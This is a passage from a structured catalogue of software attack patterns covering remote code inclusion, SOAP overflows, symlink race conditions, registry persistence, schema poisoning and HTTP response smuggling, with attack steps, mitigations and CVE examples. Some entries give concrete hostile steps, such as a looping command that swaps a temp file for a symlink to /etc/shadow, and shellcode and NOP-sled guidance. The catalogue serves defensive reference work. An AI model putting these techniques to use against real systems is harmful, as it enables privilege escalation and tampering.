information.::\",\"::The targeted PHP application must have a bug that allows an attacker to control which code file is loaded at some juncture.::\",\"\",\"::The attacker needs to have enough access to the target application to control the identity of a locally included PHP file.::\",\"\",\"\",\"\",\"\",\"::829::\",\"\",\"\",\n253,\"Remote Code Inclusion\",Standard,Draft,\"The attacker forces an application to load arbitrary code files from a remote location. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load malicious files that the attacker placed on the remote machine, or to otherwise change the functionality of the targeted application in unexpected ways.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:175::NATURE:CanPrecede:CAPEC ID:664::\",\"\",\"::Target application server must allow remote files to be included.The malicious file must be placed on the remote machine previously.::\",\"\",\"\",\"\",\"\",\"::Minimize attacks by input validation and sanitization of any user data that will be used by the target application to locate a remote file to be included.::\",\"\",\"::829::\",\"TAXONOMY NAME:WASC:ENTRY ID:05:ENTRY NAME:Remote File Inclusion::\",\"\",\n256,\"SOAP Array Overflow\",Detailed,Draft,\"An attacker sends a SOAP request with an array whose actual length exceeds the length indicated in the request. If the server processing the transmission naively trusts the specified size, then an attacker can intentionally understate the size of the array, possibly resulting in a buffer overflow if the server attempts to read the entire data set into the memory it allocated for a smaller array.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:100::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary identifies a target application to perform the buffer overflow on. In this attack, adversaries look for applications that utilize SOAP as a communication mechanism.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.:TECHNIQUE:The adversary creates a SOAP message that incorrectly specifies the size of its array to be smaller than the size of the actual content by a large margin and sends it to the application. If this causes a crash or some unintended behavior, it is likely that this is a valid injection vector.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.:TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs:TECHNIQUE:The adversary will choose a SOAP type that allows them to put shellcode into the buffer when the array is read into the application.::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the injection vector, the adversary sends the crafted SOAP message to the program, overflowing the buffer.::\",\"::The targeted SOAP server must trust that the array size as stated in messages it receives is correct, but read through the entire content of the message regardless of the stated size of the array.::\",\"\",\"::The attacker must be able to craft malformed SOAP messages, specifically, messages with arrays where the stated array size understates the actual size of the array in the message.::\",\"\",\"\",\"::If the server either verifies the correctness of the stated array size or if the server stops processing an array once the stated number of elements have been read, regardless of the actual array size, then this attack will fail. The former detects the malformed SOAP message while the latter ensures that the server does not attempt to load more data than was allocated for.::\",\"\",\"::805::\",\"TAXONOMY NAME:WASC:ENTRY ID:35:ENTRY NAME:SOAP Array Abuse::\",\"\",\n26,\"Leveraging Race Conditions\",Meta,Stable,\"The adversary targets a race condition occurring when multiple processes access and manipulate the same resource concurrently, and the outcome of the execution depends on the particular order in which the access takes place. The adversary can leverage a race condition by running the race, modifying the resource and modifying the normal execution flow. For instance, a race condition can occur while accessing a file: the adversary can trick the system by replacing the original file with their version and cause the system to read the malicious file.\",\"\",High,High,\"\",\"::STEP:1:PHASE:Explore:DESCRIPTION:The adversary explores to gauge what level of access they have.::STEP:2:PHASE:Experiment:DESCRIPTION:The adversary gains access to a resource on the target host. The adversary modifies the targeted resource. The resource's value is used to determine the next normal execution action.::STEP:3:PHASE:Exploit:DESCRIPTION:The resource is modified/checked concurrently by multiple processes. By using one of the processes, the adversary is able to modify the value just before it is consumed by a different process. A race condition occurs and is exploited by the adversary to abuse the target host.::\",\"::A resource is accessed/modified concurrently by multiple processes such that a race condition exists.::The adversary has the ability to modify the resource.::\",\"::SKILL:Being able to run the race requires basic knowledge of concurrent processing including synchonization techniques.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Use safe libraries to access resources such as files.::Be aware that improper use of access function calls such as chown(), tempfile(), chmod(), etc. can cause a race condition.::Use synchronization to control the flow of execution.::Use static analysis tools to find race conditions.::Pay attention to concurrency problems related to the access of resources.::\",\"::The Net Direct client for Linux before 6.0.5 in Nortel Application Switch 2424, VPN 3050 and 3070, and SSL VPN Module 1000 extracts and executes files with insecure permissions, which allows local users to exploit a race condition to replace a world-writable file in /tmp/NetClient and cause another user to execute arbitrary code when attempting to execute this client, as demonstrated by replacing /tmp/NetClient/client. See also: CVE-2007-1057::The following code illustrates a file that is accessed multiple times by name in a publicly accessible directory. A race condition exists between the accesses where an attacker can replace the file referenced by the name (see [REF-107]). include <sys/types.h>include <fcntl.h>include <unistd.h> define FILE /tmp/myfiledefine UID 100 void test(char *str){int fd;fd = creat(FILE, 0644);if(fd == -1)return; chown(FILE, UID, -1); /* BAD */close(fd); } int main(int argc, char **argv){char *userstr;if(argc > 1) {userstr = argv[1];test(userstr); }return 0; }::\",\"::368::363::366::370::362::662::689::667::665::1223::1254::1298::\",\"\",\"\",\n261,\"Fuzzing for garnering other adjacent user/sensitive data\",Detailed,Draft,\"An adversary who is authorized to send queries to a target sends variants of expected queries in the hope that these modified queries might return information (directly or indirectly through error logs) beyond what the expected set of queries should provide.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:54::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Observe communication and inputs] The fuzzing adversary observes the target system looking for inputs and communications between modules, subsystems, or systems.:TECHNIQUE:Network sniffing. Using a network sniffer such as wireshark, the adversary observes communications into and out of the target system.:TECHNIQUE:Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the adversary observes the system calls and API calls that are made by the target system, and the nature of their parameters.:TECHNIQUE:Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)::STEP:2:PHASE:Experiment:DESCRIPTION:[Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.:TECHNIQUE:Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).:TECHNIQUE:Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system.::STEP:3:PHASE:Experiment:DESCRIPTION:[Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if there are any log or error messages that either provide user/sensitive data or give information about an expected template that could be used to produce this data.::STEP:4:PHASE:Exploit:DESCRIPTION:[Craft exploit payloads] If the logs did not reveal any user/sensitive data, an adversary will attempt to make the fuzzing inputs form to an expected template:TECHNIQUE:Create variants of expected templates that request additional information:TECHNIQUE:Create variants that exclude limiting clauses:TECHNIQUE:Create variants that alter fields taht identify the requester in order to subvert access controls:TECHNIQUE:Repeat different fuzzing variants until sensitive information is divulged::\",\"::The server must assume that the queries it receives follow specific templates and/or have fields or attributes that follow specific procedures. The server must process queries that it receives without adequately checking or sanitizing queries to ensure they follow these templates.::\",\"\",\"::The attacker must have sufficient privileges to send queries to the targeted server. A normal client might limit the nature of these queries, so the attacker must either have a modified client or their own application which allows them to modify the expected queries.::\",\"\",\"\",\"\",\"::A client that queries an employee database might have templates such that the user only supplies the target's name and the template dictates the fields to be returned (location, position in the company, phone number, etc.). If the server does not verify that the query matches one of the expected templates, an attacker who is allowed to send normal queries could modify their query to try to return additional information. For this example, additional information might include social security numbers or salaries.::\",\"::20::\",\"\",\"\",\n263,\"Force Use of Corrupted Files\",Detailed,Draft,\"This describes an attack where an application is forced to use a file that an attacker has corrupted. The result is often a denial of service caused by the application being unable to process the corrupted file, but other results, including the disabling of filters or access controls (if the application fails in an unsafe way rather than failing by locking down) or buffer overflows are possible.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:17::\",\"\",\"::The targeted application must utilize a configuration file that an attacker is able to corrupt. In some cases, the attacker must be able to force the (re-)reading of the corrupted file if the file is normally only consulted at startup.::The severity of the attack hinges on how the application responds to the corrupted file. If the application detects the corruption and locks down, this may result in the denial of services provided by the application. If the application fails to detect the corruption, the result could be a more severe denial of service (crash or hang) or even an exploitable buffer overflow. If the application detects the corruption but fails in an unsafe way, this attack could result in the continuation of services but without certain security structures, such as filters or access controls. For example, if the corrupted file configures filters, an unsafe response from an application could result in simply disabling the filtering mechanisms due to the lack of usable configuration data.::\",\"\",\"::This varies depending on the resources necessary to corrupt the configuration file and the resources needed to force the application to re-read it (if any).::\",\"\",\"\",\"\",\"\",\"::829::\",\"\",\"\",\n267,\"Leverage Alternate Encoding\",Standard,Draft,\"An adversary leverages the possibility to encode potentially harmful input or content used by applications such that the applications are ineffective at validating this encoding standard.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:153::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and injects various payloads using a variety of different types of encodings to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.:TECHNIQUE:Try to use different encodings of content in order to bypass validation routines.::\",\"::The application's decoder accepts and interprets encoded characters. Data canonicalization, input filtering and validating is not done properly leaving the door open to harmful characters for the target host.::\",\"::SKILL:An adversary can inject different representation of a filtered character in a different encoding.:LEVEL:Low::SKILL:An adversary may craft subtle encoding of input data by using the knowledge that they have gathered about the target host.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::\",\"::Assume all input might use an improper representation. Use canonicalized data inside the application; all data must be converted into the representation used inside the application (UTF-8, UTF-16, etc.)::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.::\",\"::Microsoft Internet Explorer 5.01 SP4, 6, 6 SP1, and 7 does not properly handle unspecified encoding strings, which allows remote adversaries to bypass the Same Origin Policy and obtain sensitive information via a crafted web site, aka Post Encoding Information Disclosure Vulnerability. Related Vulnerabilities CVE-2010-0488::Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.::\",\"::173::172::180::181::73::74::20::697::692::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1027:ENTRY NAME:Obfuscated Files or Information::\",\"\",\n268,\"Audit Log Manipulation\",Standard,Draft,\"The attacker injects, manipulates, deletes, or forges malicious log entries into the log file, in an attempt to mislead an audit of the log file or cover tracks of an attack. Due to either insufficient access controls of the log files or the logging mechanism, the attacker is able to perform such actions.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:161::\",\"\",\"::The target host is logging the action and data of the user.::The target host insufficiently protects access to the logs or logging mechanisms.::\",\"\",\"::The attacker must understand how the logging mechanism works. Optionally, the attacker must know the location and the format of individual entries of the log files.::\",\"\",\"\",\"\",\"\",\"::117::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1070:ENTRY NAME:Indicator Removal on Host::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.002:ENTRY NAME:Impair Defenses: Disable Windows Event Logging::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.003:ENTRY NAME:Impair Defenses: Impair Command History Logging::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.008:ENTRY NAME:Impair Defenses: Disable Cloud Logs::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Log Injection::\",\"\",\n27,\"Leveraging Race Conditions via Symbolic Links\",Detailed,Draft,\"This attack leverages the use of symbolic links (Symlinks) in order to write to sensitive files. An attacker can create a Symlink link to a target file not otherwise accessible to them. When the privileged program tries to create a temporary file with the same name as the Symlink link, it will actually write to the target file pointed to by the attackers' Symlink link. If the attacker can insert malicious content in the temporary file they will be writing to the sensitive file by using the Symlink. The race occurs because the system checks if the temporary file exists, then creates the file. The attacker would typically create the Symlink during the interval between the check and the creation of the temporary file.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:29::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Verify that target host's platform supports symbolic links.] This attack pattern is only applicable on platforms that support symbolic links.:TECHNIQUE:Research target platform to determine whether it supports symbolic links.:TECHNIQUE:Create a symbolic link and ensure that it works as expected on the given platform.::STEP:2:PHASE:Explore:DESCRIPTION:[Examine application's file I/O behavior] Analyze the application's file I/O behavior to determine where it stores files, as well as the operations it performs to read/write files.:TECHNIQUE:Use kernel tracing utility such as ktrace to monitor application behavior.:TECHNIQUE:Use debugging utility such as File Monitor to monitor the application's filesystem I/O calls:TECHNIQUE:Watch temporary directories to see when temporary files are created, modified and deleted.:TECHNIQUE:Analyze source code for open-source systems like Linux, Apache, etc.::STEP:3:PHASE:Experiment:DESCRIPTION:[Verify ability to write to filesystem] The attacker verifies ability to write to the target host's file system.:TECHNIQUE:Create a file that does not exist in the target directory (e.g. touch temp.txt in UNIX-like systems):TECHNIQUE:On platforms that differentiate between file creation and file modification, if the target file that the application writes to already exists, attempt to modify it.:TECHNIQUE:Verify permissions on target directory::STEP:4:PHASE:Exploit:DESCRIPTION:[Replace file with a symlink to a sensitive system file.] Between the time that the application checks to see if a file exists (or if the user has access to it) and the time the application actually opens the file, the attacker replaces the file with a symlink to a sensitive system file.:TECHNIQUE:Create an infinite loop containing commands such as rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat. Wait for an instance where the following steps occur in the given order: (1) Application ensures that tempfile.dat exists and that the user has access to it, (2) rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat, and (3) Application opens tempfile.dat for writing, and inadvertently opens /etc/shadow for writing instead.:TECHNIQUE:Use other techniques with debugging tools to replace the file between the time the application checks the file and the time the application opens it.::\",\"::The attacker is able to create Symlink links on the target host.::Tainted data from the attacker is used and copied to temporary files.::The target host does insecure temporary file creation.::\",\"::SKILL:This attack is sophisticated because the attacker has to overcome a few challenges such as creating symlinks on the target host during a precise timing, inserting malicious data in the temporary file and have knowledge about the temporary files created (file name and function which creates them).:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::\",\"::Use safe libraries when creating temporary files. For instance the standard library function mkstemp can be used to safely create temporary files. For shell scripts, the system utility mktemp does the same thing.::Access to the directories should be restricted as to prevent attackers from manipulating the files. Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file.::Follow the principle of least privilege when assigning access rights to files.::Ensure good compartmentalization in the system to provide protected areas that can be trusted.::\",\"::In this naive example, the Unix program foo is setuid. Its function is to retrieve information for the accounts specified by the user. For efficiency, it sorts the requested accounts into a temporary file (/tmp/foo naturally) before making the queries. The directory /tmp is world-writable. The malicious user creates a symbolic link to the file /.rhosts named /tmp/foo. Then, they invokes foo with user as the requested account. The program creates the (temporary) file /tmp/foo (really creating /.rhosts) and puts the requested account (e.g. user password)) in it. It removes the temporary file (merely removing the symbolic link). Now the /.rhosts contains + +, which is the incantation necessary to allow anyone to use rlogin to log into the computer as the superuser. [REF-115]::GNU ed utility (before 0.3) allows local users to overwrite arbitrary files via a symlink attack on temporary files, possibly in the open_sbuf function. See also: CVE-2006-6939::OpenmosixCollector and OpenMosixView in OpenMosixView 1.5 allow local users to overwrite or delete arbitrary files via a symlink attack on (1) temporary files in the openmosixcollector directory or (2) nodes.tmp. See also: CVE-2005-0894::Setuid product allows file reading by replacing a file being edited with a symlink to the targeted file, leaking the result in error messages when parsing fails. See also: CVE-2000-0972::\",\"::367::61::662::689::667::\",\"\",\"\",\n270,\"Modification of Registry Run Keys\",Detailed,Stable,\"An adversary adds a new entry to the run keys in the Windows registry so that an application of their choosing is executed when a user logs in. In this way, the adversary can get their executable to operate and run on the target system with the authorized user's level of permissions. This attack is a good way for an adversary to run persistent spyware on a user's machine, such as a keylogger.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:203::NATURE:CanPrecede:CAPEC ID:568::NATURE:CanPrecede:CAPEC ID:529::NATURE:CanPrecede:CAPEC ID:646::NATURE:CanFollow:CAPEC ID:555::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target system] The adversary must first determine the system they wish to target. This attack only works on Windows.::STEP:2:PHASE:Experiment:DESCRIPTION:[Gain access to the system] The adversary needs to gain access to the system in some way so that they can modify the Windows registry.:TECHNIQUE:Gain physical access to a system either through shoulder surfing a password or accessing a system that is left unlocked.:TECHNIQUE:Gain remote access to a system through a variety of means.::STEP:3:PHASE:Exploit:DESCRIPTION:[Modify Windows registry] The adversary will modify the Windows registry by adding a new entry to the run keys referencing a desired program. This program will be run whenever the user logs in.::\",\"::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::\",\"\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data:TECHNICAL IMPACT:Gain Privileges::\",\"::Identify programs that may be used to acquire process information and block them by using a software restriction policy or tools that restrict program execution by using a process allowlist.::\",\"::An adversary can place a malicious executable (RAT) on the target system and then configure it to automatically run when the user logs in to maintain persistence on the target system.::Through the modification of registry run keys the adversary can masquerade a malicious executable as a legitimate program.::\",\"::15::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1547.001:ENTRY NAME:Boot or Logon Autostart Execution: Registry Run Keys / Start Folder::::TAXONOMY NAME:ATTACK:ENTRY ID:1547.014:ENTRY NAME:Boot or Logon Autostart Execution: Active::\",\"\",\n271,\"Schema Poisoning\",Standard,Draft,\"An adversary corrupts or modifies the content of a schema for the purpose of undermining the security of the target. Schemas provide the structure and content definitions for resources used by an application. By replacing or modifying a schema, the adversary can affect how the application handles or interprets a resource, often leading to possible denial of service, entering into an unexpected state, or recording incomplete data.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:176::NATURE:CanFollow:CAPEC ID:94::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find target application and schema] The adversary first finds the application that they want to target. This application must use schemas in some way, so the adversary also needs to confirm that schemas are being used.:TECHNIQUE:Gain access to the system that the application is on and look for a schema.:TECHNIQUE:Observe HTTP traffic to the application and look for a schema being transmitted.::STEP:2:PHASE:Experiment:DESCRIPTION:[Gain access to schema] The adversary gains access to the schema so that they can modify the contents.:TECHNIQUE:For a local scenario, the adversary needs access to the machine that the schema is located on and gain permissions to alter the contents of the schema file.:TECHNIQUE:For a remote scenario, the adversary needs to be able to perform an adversary in the middle attack on the HTTP traffic that contains a schema.::STEP:3:PHASE:Exploit:DESCRIPTION:[Poison schema] Once the adversary gains access to the schema, they will alter it to achieve a desired effect. Locally, they can just modify the file. For remote schemas, the adversary will alter the schema in transit by performing an adversary in the middle attack.:TECHNIQUE:Cause a denial of service by modifying the schema so that it does not contain required information for subsequent processing.:TECHNIQUE:Manipulation of the data types described in the schema may affect the results of calculations. For example, a float field could be changed to an int field.:TECHNIQUE:Change the encoding defined in the schema for certain fields allowing the contents to bypass filters that scan for dangerous strings. For example, the modified schema might use a URL encoding instead of ASCII, and a filter that catches a semicolon (;) might fail to detect its URL encoding (%3B).::\",\"::Some level of access to modify the target schema.::The schema used by the target application must be improperly secured against unauthorized modification and manipulation.::\",\"\",\"::Access to the schema and the knowledge and ability modify it. Ability to replace or redirect access to the modified schema.::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:A successful schema poisoning attack can compromise the availability of the target system's service by exhausting its available resources.::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Design: Protect the schema against unauthorized modification.::Implementation: For applications that use a known schema, use a local copy or a known good repository instead of the schema reference supplied in the schema document.::Implementation: For applications that leverage remote schemas, use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification.::\",\"::In a JSON Schema Poisoning Attack, an adervary modifies the JSON schema to cause a Denial of Service (DOS) or to submit malicious input: { title: Contact, type: object, properties: { Name: { type: string }, Phone: { type: string }, Email: { type: string }, Address: { type: string } }, required: [Name, Phone, Email, Address] } If the 'name' attribute is required in all submitted documents and this field is removed by the adversary, the application may enter an unexpected state or record incomplete data. Additionally, if this data is needed to perform additional functions, a Denial of Service (DOS) may occur.::In a Database Schema Poisoning Attack, an adversary alters the database schema being used to modify the database in some way. This can result in loss of data, DOS, or malicious input being submitted. Assuming there is a column named name, an adversary could make the following schema change: ALTER TABLE Contacts MODIFY Name VARCHAR(65353); The Name field of the Conteacts table now allows the storing of names up to 65353 characters in length. This could allow the adversary to store excess data within the database to consume system resource or to execute a DOS.::\",\"::15::\",\"\",\"\",\n272,\"Protocol Manipulation\",Meta,Draft,\"An adversary subverts a communications protocol to perform an attack. This type of attack can allow an adversary to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks. This type of attack targets invalid assumptions that may be inherent in implementers of the protocol, incorrect implementations of the protocol, or vulnerabilities in the protocol itself.\",\"\",,Medium,\"\",\"\",\"::The protocol or implementations thereof must contain bugs that an adversary can exploit.::\",\"\",\"::In some variants of this attack the adversary must be able to intercept communications using the protocol. This means they need to be able to receive the communications from one participant and prevent the other participant from receiving these communications.::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n273,\"HTTP Response Smuggling\",Detailed,Stable,\"An adversary manipulates and injects malicious content in the form of secret unauthorized HTTP responses, into a single HTTP response from a vulnerable or compromised back-end HTTP agent (e.g., server). See CanPrecede relationships for possible consequences.\",\"::TERM:HTTP Desync:DESCRIPTION:Modification/manipulation of HTTP message headers, request-line and body parameters to disrupt and interfere in the interpretation and parsing of HTTP message lengths/boundaries for consecutive HTTP messages by HTTP agents in a HTTP chain or network path.::\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:220::NATURE:PeerOf:CAPEC ID:33::NATURE:CanPrecede:CAPEC ID:115::NATURE:CanPrecede:CAPEC ID:141::NATURE:CanPrecede:CAPEC ID:63::NATURE:CanPrecede:CAPEC ID:593::NATURE:CanPrecede:CAPEC ID:148::NATURE:CanPrecede:CAPEC ID:154::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets.:TECHNIQUE:Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer.::STEP:1:PHASE:Experiment:DESCRIPTION:[Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure to intended targets in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, message sizes, and HTTP headers.::STEP:2:PHASE:Experiment:DESCRIPTION:[Cause differential HTTP responses by experimenting with identified HTTP Response vulnerabilities] The adversary sends maliciously crafted HTTP request to back-end HTTP infrastructure to inject adversary data into HTTP responses (intended for intermediary and/or front-end client/victim HTTP agents communicating with back-end HTTP infrastructure) for the purpose of interfering with the parsing of HTTP response. The intended consequences of the malicious HTTP request and the subsequent adversary injection and manipulation of HTTP responses will be observed to confirm applicability of identified vulnerabilities in the adversary's plan of attack.:TECHNIQUE:Continue the monitoring of HTTP traffic.:TECHNIQUE:Inject additional HTTP headers to utilize various combinations of HTTP Headers within a single HTTP message such as: Content-Length & Transfer-Encoding (CL;TE), Transfer-Encoding & Content-Length (TE;CL), or double Transfer-Encoding (TE;TE), so that additional embedded message or data in the body of the original message are unprocessed and treated as part of subsequent messages by the intended target HTTP agent. From these HTTP Header combinations the adversary observes any timing delays (usually in the form of HTTP 404 Error response) or any other unintended consequences. For CL;TE and TE;CL HTTP headers combination, the first HTTP agent, in the HTTP message path that receives the HTTP message, takes precedence or only processes the one header but not the other, while the second/final HTTP agent processes the opposite header allowing for embedded HTTP message to be ignored and smuggled to the intended target HTTP agent. For TE;TE HTTP headers combination, all HTTP agents in HTTP message path process Transfer-Encoding header, however, adversary obfuscation of one of the Transfer-Encoding headers, by not adhering strictly to the protocol specification, can cause it to be unprocessed/ignored by a designated HTTP agent, hence allowing embedded HTTP messages to be smuggled. See Mitigations for details.:TECHNIQUE:Construct a very large HTTP message via multiple Content-Length headers of various data lengths that can potentially cause subsequent messages to be ignored by an intermediary HTTP agent (e.g., firewall) and/or eventually parsed separately by the target HTTP agent. Note that most modern HTTP infrastructure reject HTTP messages with multiple Content-Length headers.:TECHNIQUE:Monitor HTTP traffic using a tool such as a Network Protocol Analyzer.::STEP:1:PHASE:Exploit:DESCRIPTION:[Perform HTTP Response Smuggling attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.:TECHNIQUE:Leverage techniques identified in the Experiment Phase.::\",\"::A vulnerable or compromised server or domain/site capable of allowing adversary to insert/inject malicious content that will appear in the server's response to target HTTP agents (e.g., proxies and users' web browsers).::Differences in the way the two HTTP agents parse and interpret HTTP responses and its headers.::HTTP agents running on HTTP/1.1 that allow for Keep Alive mode, Pipelined queries, and Chunked queries and responses.::\",\"::SKILL:Detailed knowledge on HTTP protocol: request and response messages structure and usage of specific headers.:LEVEL:Medium::SKILL:Detailed knowledge on how specific HTTP agents receive, send, process, interpret, and parse a variety of HTTP messages and headers.:LEVEL:Medium::SKILL:Possess knowledge on the exact details in the discrepancies between several targeted HTTP agents in path of an HTTP message in parsing its message structure and individual headers.:LEVEL:Medium::\",\"::Tools capable of monitoring HTTP messages, and crafting malicious HTTP messages and/or injecting malicious content into HTTP messages.::\",\"::Differences in responses processed by the two agents. This requires careful monitoring or a capable log analysis tool.::\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Design: evaluate HTTP agents prior to deployment for parsing/interpretation discrepancies.::Configuration: front-end HTTP agents notice ambiguous requests.::Configuration: back-end HTTP agents reject ambiguous requests and close the network connection.::Configuration: Disable reuse of back-end connections.::Configuration: Use HTTP/2 for back-end connections.::Configuration: Use the same web server software for front-end and back-end server.::Implementation: Utilize a Web Application Firewall (WAF) that has built-in mitigation to detect abnormal requests/responses.::Configuration: Prioritize Transfer-Encoding header over Content-Length, whenever an HTTP message contains both.::Configuration: Disallow HTTP messages with both Transfer-Encoding and Content-Length or Double Content-Length Headers.::Configuration: Disallow Malformed/Invalid Transfer-Encoding Headers used in obfuscation, such as: Headers with no space before the value “chunked” Headers with extra spaces Headers beginning with trailing characters Headers providing a value “chunk” instead of “chunked” (the server normalizes this as chunked encoding) Headers with multiple spaces before the value “chunked” Headers with quoted values (whether single or double quotations) Headers with CRLF characters before the value “chunked” Values with invalid characters::Configuration: Install latest vendor security patches available for both intermediary and back-end HTTP infrastructure (i.e. proxies and web servers)::Configuration: Ensure that HTTP infrastructure in the chain or network path utilize a strict uniform parsing process.::Implementation: Utilize intermediary HTTP infrastructure capable of filtering and/or sanitizing user-input.::\",\"::When using Undertow, a Java-based web server in Red Hat's Jboss Enterprise Application Platform version 7.0, the code responsible for parsing HTTP requests permitted invalid characters, that could allow the injection of data into HTTP responses from Undertow to clients when used in tandem with a proxy; allowing for web-cache poisoning, XSS, and confidentiality violation of sensitive information from other HTTP requests sent to Undertow. See also: CVE-2017-2666::Mozilla Firefox and Thunderbird before 1.5.04, with various proxy servers, interpreted HTTP responses differently if HTTP response headers included a space between the header name and colon or if HTTP 1.1 headers were sent through a proxy configured with HTTP 1.0, allowing for HTTP Smuggling vulnerability. See also: CVE-2006-2786::\",\"::74::436::444::\",\"TAXONOMY NAME:WASC:ENTRY ID:27:ENTRY NAME:HTTP Response Smuggling::\",\"TYPE:Terminology:NOTE:HTTP Splitting – the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender’s intension. The messages sent are 100% valid and RFC compliant [REF-117].::::TYPE:Terminology:NOTE:HTTP Smuggling – the act of forcing a sender of (HTTP) messages to emit data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender’s intention. This is done by virtue of forcing the sender to emit non-standard messages which can be 